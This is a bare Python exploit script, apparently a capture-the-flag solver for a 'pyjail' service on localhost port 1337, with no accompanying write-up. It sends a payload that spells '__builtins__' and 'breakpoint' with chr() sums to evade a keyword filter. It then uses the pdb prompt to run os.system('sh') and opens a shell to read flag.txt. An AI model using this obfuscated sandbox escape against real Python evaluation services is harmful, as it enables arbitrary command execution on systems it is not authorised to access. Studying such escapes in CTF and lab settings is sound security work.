#!/usr/bin/env python3
import socket

HOST = "127.0.0.1"
PORT = 1337

payload = (
    'blacklist = vars(vars()[chr(95)*2+chr(98)+chr(117)+chr(105)+chr(100+8)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)*2])'
    '[chr(98)+chr(114)+chr(101)+chr(97)+chr(107)+chr(112)+chr(111)+chr(105)+chr(110)+chr(116)]'
)

s = socket.socket()
s.connect((HOST, PORT))

s.sendall(payload.encode() + b"\n")
data = s.recv(4096)
print("[*] Round 1:", data.decode(errors="replace"))

s.sendall(b"c\n")
data = s.recv(4096)
print("[*] PDB prompt:", data.decode(errors="replace"))

s.sendall(b"import os; os.system('sh')\n")
data = s.recv(4096)
print("[*] Shell:", data.decode(errors="replace"))

s.sendall(b"cat flag.txt\n")
data = s.recv(4096)
print("[*] Flag:", data.decode(errors="replace"))

s.close()
